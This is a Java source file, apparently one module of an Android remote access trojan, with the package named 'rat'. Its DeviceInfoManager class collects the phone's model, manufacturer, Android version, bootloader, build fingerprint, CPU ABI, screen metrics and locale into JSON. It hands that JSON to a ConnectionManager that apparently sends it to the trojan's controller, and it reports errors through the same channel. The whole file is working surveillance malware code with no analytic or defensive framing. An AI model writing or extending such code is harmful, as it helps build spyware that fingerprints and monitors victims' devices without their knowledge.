package com.wexow.rat.managers;

import android.content.Context;
import android.os.Build;
import android.util.DisplayMetrics;
import org.json.JSONObject;
import java.util.Locale;

import com.wexow.rat.core.ConnectionManager;

public class DeviceInfoManager {
    public static void getInfo(Context context) {
        try {
            JSONObject jo = new JSONObject();
            jo.put("type", "device_info");
            
            JSONObject system = new JSONObject();
            system.put("Model", Build.MODEL);
            system.put("Manufacturer", Build.MANUFACTURER);
            system.put("Android Version", Build.VERSION.RELEASE);
            system.put("SDK Level", Build.VERSION.SDK_INT);
            system.put("Brand", Build.BRAND);
            system.put("Device", Build.DEVICE);
            system.put("Hardware", Build.HARDWARE);
            system.put("Board", Build.BOARD);
            system.put("Bootloader", Build.BOOTLOADER);
            system.put("Product", Build.PRODUCT);
            system.put("Display ID", Build.DISPLAY);
            system.put("Fingerprint", Build.FINGERPRINT);
            
            JSONObject hardware = new JSONObject();
            hardware.put("CPU ABI", Build.CPU_ABI);
            hardware.put("CPU ABI2", Build.CPU_ABI2);
            
            DisplayMetrics dm = context.getResources().getDisplayMetrics();
            hardware.put("Resolution", dm.widthPixels + "x" + dm.heightPixels);
            hardware.put("DPI", dm.densityDpi);
            
            JSONObject locale = new JSONObject();
            locale.put("Language", Locale.getDefault().getLanguage());
            locale.put("Country", Locale.getDefault().getCountry());
            
            jo.put("system", system);
            jo.put("hardware", hardware);
            jo.put("locale", locale);
            
            ConnectionManager.send(jo.toString());
        } catch (Exception e) {
            try {
                JSONObject err = new JSONObject();
                err.put("type", "device_info");
                err.put("error", e.getMessage());
                ConnectionManager.send(err.toString());
            } catch (Exception ignored) {}
        }
    }
}
